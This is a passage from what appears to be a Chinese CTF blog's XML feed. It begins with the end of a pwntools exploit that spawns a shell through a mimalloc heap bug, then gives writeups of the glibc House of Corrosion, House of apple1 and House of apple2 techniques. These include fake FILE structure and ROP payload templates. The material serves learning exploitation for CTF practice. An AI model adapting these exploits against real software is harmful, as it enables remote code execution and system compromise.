class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Unknown option&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./mimalloc_heap&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;123.56.236.235&quot;,39254)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./mimalloc_heap&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.send(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.send(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.send(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size))</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.send(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xa0</span>)<span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10140</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">payload = cyclic(<span class="number">0xa0</span>)+p64(heap_addr+<span class="number">0x188</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0xa0</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xa0</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">tld_main = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = tld_main-<span class="number">0x216380</span></span><br><span class="line">libmimalloc_addr = tld_main-<span class="number">0x24380</span></span><br><span class="line">success(<span class="string">&quot;tld_addr :&quot;</span>+<span class="built_in">hex</span>(tld_main))</span><br><span class="line">add(<span class="number">0xb0</span>)<span class="comment">#3</span></span><br><span class="line">defreed_addr = libmimalloc_addr + <span class="number">0x2e190</span></span><br><span class="line">payload = cyclic(<span class="number">0xc0</span>)+p64(defreed_addr-<span class="number">0x8</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0xb0</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0xb0</span>)<span class="comment">#5</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">success(<span class="string">&quot;libmimalloc_addr :&quot;</span>+<span class="built_in">hex</span>(libmimalloc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">setcontext_addr = libc_addr + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">rdi_addr = libc_addr + <span class="number">0x0000000000023b6a</span></span><br><span class="line">ret_addr = rdi_addr+<span class="number">1</span></span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = p64(heap_addr+<span class="number">0x100a0</span>)+p64(setcontext_addr)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(heap_addr+<span class="number">0x100a0</span>)+p64(ret_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *_mi_malloc_generic+327&#x27;)</span></span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> extra </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>House of Corrosion</title>
      <link href="/2023/07/16/House-of-Corrosion/"/>
      <url>/2023/07/16/House-of-Corrosion/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于fastbin的一种利用手法 目前做题中没有做到需要这条链的</p><p>偶然看到vnctf2022的压轴题考到了这种方法 就索性来学习一下</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>主要是通过global_max_fast来实现的 其规定了fastbin链表的最大范围 如果我们将其修改为一个很大的值 那么就会导致超出范围的chunk被释放到了fastbin</p><p>和tcachebin的mp+80利用类似 其会导致tcache的结构体的entry指针数组无法容纳下足够多的链表头指针</p><p>fastbin也有自己的用来管理链表头的数组 我们称之为fastbinY 其位于main_arena上</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161711477.png" title="image-20230716171101455" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161711477.png" alt="image-20230716171101455"></a></p><p>如果我们通过修改global_max_fast 从而把一个大chunk释放到了fastbin中 那么其指针就会超过fastbinY的范围 从而延申到高地址处 那么我们也就相当于可以往fastbinY高地址处任意写一个堆地址</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>首先我们想办法将global_max_fast的值修改为一个极大值 这里我选择的办法是largebin attack</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161715171.png" title="image-20230716171532147" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161715171.png" alt="image-20230716171532147"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161716334.png" title="image-20230716171629313" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161716334.png" alt="image-20230716171629313"></a></p><p>随后我们计算一下fastbinY和我们想要写入堆地址的偏移 如上图 这个时候和_IO_list_all偏移为0xa10</p><p>那么我们最后只需要申请一个  0x10+0xa10*2的chunk 并且将其释放 那么其指针就会被放入_IO_list_all</p><p>这一点可以延申出什么利用效果呢 如果题目存在UAF漏洞 那么我们就可以泄露fastbinY后的内存空间上的任意数据</p><p>比如此时我想要泄露main_arena+784处的内容</p><p>那么我就需要申请一个  2*（784-16）+0x10 也就是0x610的chunk</p><p>此时再次释放后 由于链表的并入机制 此时的chunk地址就会填入main_arena+784</p><p>而其原本的内容 就会被充当chunk的fd域</p><p>同理 如果我们修改已经被释放chunk的fd域 随后再次申请该chunk出来 此时的fd域就会被充当链表头 那么就相当于了一次任意写</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>House of apple2</title>
      <link href="/2023/07/16/House-of-apple2/"/>
      <url>/2023/07/16/House-of-apple2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然是名为house of apple2 但是和apple1的利用没有太大的关系 当成一条全新的链就行了</p><p>只需要一次largebin就可以实现的链 适用于2.35这样的高版本 触发条件为exit或者abort 需要调用到io结构体的vtable的overflow函数</p><h2 id="链路分析"><a href="#链路分析" class="headerlink" title="链路分析"></a>链路分析</h2><p>触发的方式和apple1是一样的 可以通过显示调用的exit 或者是从main函数返回的隐式exit 或者是malloc_assert输出报错信息</p><p>下面是通过exit触发的链</p><p>exit -&gt; fcloseall -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</p><p>主要的思想就是劫持IO_list_all为堆地址 从而我们可以伪造io结构体</p><p>这里主要注意的就是两个成员  一个是_wide_data 一个是vtable</p><p>我们先说vtable 这里的思路是将其伪造为_IO_wfile_jumps </p><p>这样触发io时会调用到_IO_wfile_overflow 来看一下这个函数主要的内容</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161614545.png" title="image-20230716161414471" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161614545.png" alt="image-20230716161414471"></a></p><p>其内部调用了wdoallocbuf函数 这个函数存在一个任意函数调用的点</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161615628.png" title="image-20230716161503609" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161615628.png" alt="image-20230716161503609"></a></p><p>其索引是通过rax寄存器来的</p><p>而此时的rax值 就是fakeio的0xa0偏移处的wide_data成员</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161615252.png" title="image-20230716161559230" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161615252.png" alt="image-20230716161559230"></a></p><p>其wide_data处要求是一个结构体指针 wdoallocbuf函数会调用该指针的vtable的overflow函数</p><p>如果我们将其控制为setcontext 就可以实现一段rop 哪怕是开启了沙盒 也是适用的</p><h2 id="伪造分析"><a href="#伪造分析" class="headerlink" title="伪造分析"></a>伪造分析</h2><p>关键的伪造点就那几个 </p><p>1.先要把_IO_list_all利用largebin attack先覆盖成可控地址 用来伪造结构体 下面称fakeio1</p><p>2.控制fakeio1的vtable为_IO_wfile_jumps 从而调用到 _IO_wfile_overflow</p><p>3.控制fakeio1的_wide_date为fakeio2</p><p>4.控制fakeio2的vtable为fakeio3</p><p>5.控制fakeio3的偏移0x68处为setcontext</p><p>需要注意的就是最后的rop链存放的位置不能影响到fakeio的其他成员 导致程序执行流无法顺利执行</p><p>还有就是之所以 不直接更改_wide_data-&gt;vtable-&gt;0x68为system函数 然后设置fakeio首地址处为&#x2F;bin&#x2F;sh  这样破坏了flag成员 无法让程序执行流按预期的执行</p><p>剩下的就参考下面的模板吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fakeio1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IO_wfile_jumps = libc_addr + <span class="number">0x2160c0</span></span><br><span class="line">fake_file = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(chunk5_addr)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(IO_wfile_jumps)</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+fake_file</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fakeio2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(setcontext)</span><br><span class="line">payload = payload.ljust(<span class="number">0x90</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(chunk5_addr+<span class="number">0xf0</span>)+p64(ret_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(chunk5_addr)+p64(<span class="number">0</span>)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>House of apple1</title>
      <link href="/2023/07/07/House-of-apple1/"/>
      <url>/2023/07/07/House-of-apple1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2.35很好用的一条链 十分推荐学习 仍然建议是自己看完分析以后 然后动调学着伪造结构体  毕竟ctf的pwn学习主要还是培养思维</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>通过劫持io_list_all 利用exit函数触发overflow 可以达到任意地址写已知地址的功能</p><p>完整的利用链如下</p><p>exit -&gt; fcloseall -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</p><p>而我们只需要利用largebinattack往IO_list_all中写入一个堆地址 随后在该chunk上构造结构体</p><p>首先要明白一点 exit函数的执行 会通过IO_list_all来索引所有的iofile 并且通过其vtable来索引到对应的overflow函数 那么来看一下IO_wstrn_jumps的overflow函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* When we come to here this means the user supplied buffer is</span></span><br><span class="line"><span class="comment">     filled.  But since we must return the number of characters which</span></span><br><span class="line"><span class="comment">     would have been written in total we must provide a buffer for</span></span><br><span class="line"><span class="comment">     further use.  We can do this by writing on and on in the overflow</span></span><br><span class="line"><span class="comment">     buffer in the _IO_wstrnfile structure.  */</span></span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">         snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                      / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">                      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                     / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Since we are not really interested in storing the characters</span></span><br><span class="line"><span class="comment">     which do not fit in the buffer we simply ignore it.  */</span></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在最开始 进行了一个指针类型的转化 但是snf和fp还是指向同一个iofile 也就是我们的chunk</p><p>接着如果通过了这个判断 就可以进入if分支</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</span><br></pre></td></tr></table></figure><p>这里的overflow_buf是什么呢 我们来看一下_IO_wstrnfile涉及到的结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">char</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_strnfile;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>]; <span class="comment">// overflow_buf在这里********</span></span><br><span class="line">&#125; _IO_wstrnfile;</span><br></pre></td></tr></table></figure><p>可以看到最后一个结构体中定义了overflow_buf的数组变量</p><p>大部分情况下 这个判断是可以通过的 目前还没有遇到过不通过的情况 遇到了再做补充</p><p>进入if分支以后 可以看到我们对于fp-&gt;_wide_data存储的成员变量赋值了很多次 </p><p>赋的值我们在随后的伪造过程中可以清晰的看到 是fakefile_addr + 0xf0 或者是+0x1f0 这里先记住一下 随后再深入研究</p><p>为了实现上述的任意地址写已知值  我们需要控制一下fakefile的_wide_data成员 并且还需要使得vtable为IO_wstrn_jumps 这样就可以往 _wide_data处的指针写入fake_file+0xf0和fake_file+0x1f0</p><p>通过下面iofile的成员偏移 可以得知我们需要往fakefile的0xa0写入一个地址 往0xd8写入IO_wstrn_jumps 同时伪造好相关的成员 使得我们能够执行到IO_wstrn_overflow函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">amd64：</span><br><span class="line"> </span><br><span class="line">0x0:&#x27;_flags&#x27;,</span><br><span class="line">0x8:&#x27;_IO_read_ptr&#x27;,</span><br><span class="line">0x10:&#x27;_IO_read_end&#x27;,</span><br><span class="line">0x18:&#x27;_IO_read_base&#x27;,</span><br><span class="line">0x20:&#x27;_IO_write_base&#x27;,</span><br><span class="line">0x28:&#x27;_IO_write_ptr&#x27;,</span><br><span class="line">0x30:&#x27;_IO_write_end&#x27;,</span><br><span class="line">0x38:&#x27;_IO_buf_base&#x27;,</span><br><span class="line">0x40:&#x27;_IO_buf_end&#x27;,</span><br><span class="line">0x48:&#x27;_IO_save_base&#x27;,</span><br><span class="line">0x50:&#x27;_IO_backup_base&#x27;,</span><br><span class="line">0x58:&#x27;_IO_save_end&#x27;,</span><br><span class="line">0x60:&#x27;_markers&#x27;,</span><br><span class="line">0x68:&#x27;_chain&#x27;,</span><br><span class="line">0x70:&#x27;_fileno&#x27;,</span><br><span class="line">0x74:&#x27;_flags2&#x27;,</span><br><span class="line">0x78:&#x27;_old_offset&#x27;,</span><br><span class="line">0x80:&#x27;_cur_column&#x27;,</span><br><span class="line">0x82:&#x27;_vtable_offset&#x27;,</span><br><span class="line">0x83:&#x27;_shortbuf&#x27;,</span><br><span class="line">0x88:&#x27;_lock&#x27;,</span><br><span class="line">0x90:&#x27;_offset&#x27;,</span><br><span class="line">0x98:&#x27;_codecvt&#x27;,</span><br><span class="line">0xa0:&#x27;_wide_data&#x27;,</span><br><span class="line">0xa8:&#x27;_freeres_list&#x27;,</span><br><span class="line">0xb0:&#x27;_freeres_buf&#x27;,</span><br><span class="line">0xb8:&#x27;__pad5&#x27;,</span><br><span class="line">0xc0:&#x27;_mode&#x27;,</span><br><span class="line">0xc4:&#x27;_unused2&#x27;,</span><br><span class="line">0xd8:&#x27;vtable&#x27;</span><br></pre></td></tr></table></figure><h2 id="伪造分析"><a href="#伪造分析" class="headerlink" title="伪造分析"></a>伪造分析</h2><p>前面利用largebin往IO_list_all写堆地址的部分就不讲了</p><p>我们先大致伪造一下fakefile 随后断点打在 _IO_flush_all_lockp 观察如何满足条件 使其执行到IO_wstrn_overflow函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_file = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(heap_addr)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(IO_wstrn_jumps)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072335560.png" title="image-20230707233506450" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072335560.png" alt="image-20230707233506450"></a></p><p>通过简单的观察汇编 我们不难发现我们需要使得程序执行到_IO_flush_all_lockp+223处才可以进入overflow函数 接下来逐步n下去 观察到这里的判断 如果不使其跳转 那么我们就跳过了223处的调用</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072336308.png" title="image-20230707233633281" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072336308.png" alt="image-20230707233633281"></a></p><p>观察一下此时r15寄存器参数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072339983.png" title="image-20230707233914959" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072339983.png" alt="image-20230707233914959"></a></p><p>这里需要使得r15+0x28处小于r15+0x20处 而此时r15寄存器存储的就是我们fake_file</p><p>所以我们在对应地址布置好参数 此时再次动调 发现成功进入overflow函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_file = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(heap_addr)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(IO_wstrn_jumps)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072340474.png" title="image-20230707234040440" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072340474.png" alt="image-20230707234040440"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072341660.png" title="image-20230707234112609" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072341660.png" alt="image-20230707234112609"></a></p><p>同时你可以看到这个函数 其赋值就是通过那一堆movdpa指令 其参数时xmm0 向上溯源一下会发现就是rdi+0xf0和rdi+0x1f0两种</p><p>此时观察我们想要写入已知值的堆基址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072343194.png" title="image-20230707234301169" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072343194.png" alt="image-20230707234301169"></a></p><p>可以发现写入成功</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>需要注意的是 在_IO_wstrn_overflow+78处 你会发现其执行了IO_wsetb函数 阅读其源码 我们会发现其内部调用了free函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wsetb (FILE *f, <span class="type">wchar_t</span> *b, <span class="type">wchar_t</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base); <span class="comment">// 其不为0的时候不要执行到这里</span></span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072346524.png" title="image-20230707234637488" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072346524.png" alt="image-20230707234637488"></a></p><p>这里的rdx值就是我们想要任意写已知值的地址 如果其+0x30处 不为0 那么就不会跳转 从而触发执行free函数 这里有时候需要注意一下 不过如果地址无法满足判断条件的话 这里还有一次更改fakefile参数来避免的办法</p><p>rbx寄存器的值就是我们fakefile的地址 使其0x74处的数据赋值给了eax 同时对于al寄存器和8进行test 如果其不为8的话 就可以绕过 (不乱改数据的话 我觉得很少的情况才会遇到吧</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072348174.png" title="image-20230707234823126" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072348174.png" alt="image-20230707234823126"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
